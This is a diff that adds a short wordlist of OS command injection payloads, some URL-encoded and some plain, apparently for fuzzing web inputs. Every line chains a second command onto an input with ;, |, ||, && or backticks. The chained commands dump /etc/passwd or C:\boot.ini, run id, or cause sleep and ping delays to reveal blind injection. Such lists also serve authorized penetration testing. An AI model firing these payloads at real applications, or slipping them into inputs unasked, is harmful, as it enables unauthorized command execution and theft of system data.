@@ -1,0 +1,35 @@
+%3B%20cat%20/etc/passwd
+%7C%20cat%20%2Fetc%2Fpasswd
+%26%26%20id
+%60id%60
+%7C%7C%20sleep%2010
+%26%26%20sleep%2010
+%7C%20type%20C%3A%5Cboot.ini
+%7C%7C%20type%20C%3A%5Cboot.ini
+%26%26%20%20ping%20127.0.0.1%20-n%2010
+%3B%20%20ping%20127.0.0.1%20-n%2010
+&& id
+`id`
+| id
+|| id
+; id
+| cat /etc/passwd
+&& cat /etc/passwd
+`cat /etc/passwd`
+; cat /etc/passwd
+|| cat /etc/passwd
+&& sleep 10
+|| sleep 10
+| sleep 10
+; sleep 10
+`sleep 10`
+| type C:\boot.ini
+|| type C:\boot.ini
+; type C:\boot.ini
+&& type C:\boot.ini
+`type C:\boot.ini`
+| ping 127.0.0.1 -n 10
+; ping 127.0.0.1 -n 10
+|| ping 127.0.0.1 -n 10
+&& ping 127.0.0.1 -n 10
+`ping 127.0.0.1 -n 10`
